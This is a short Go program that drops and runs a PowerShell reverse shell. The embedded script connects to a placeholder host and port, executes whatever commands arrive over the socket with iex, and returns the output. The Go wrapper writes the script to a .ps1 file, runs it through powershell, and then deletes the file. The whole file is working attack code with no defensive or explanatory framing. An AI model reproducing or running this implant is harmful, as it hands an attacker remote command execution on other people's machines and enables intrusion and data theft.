package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
)

func WRITETOFILE(filename string, data string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("can't create a file %s: %v", filename, err)
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return fmt.Errorf("can't write to a file %s: %v", filename, err)
	}
	return file.Sync()
}

func SHELL() {
	powershellPayload := `$client = New-Object System.Net.Sockets.TCPClient('HOST',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
	err := WRITETOFILE("FILENAME.ps1", powershellPayload)
	if err != nil {
		fmt.Printf("%s\n", err)
	}
	powershell := exec.Command("powershell", ".\\FILENAME.ps1")
	err = powershell.Run()
	if err != nil {
		fmt.Printf("%s\n", err)
	}
	os.Remove("FILENAME.ps1")
}

func main() {
	SHELL()
}
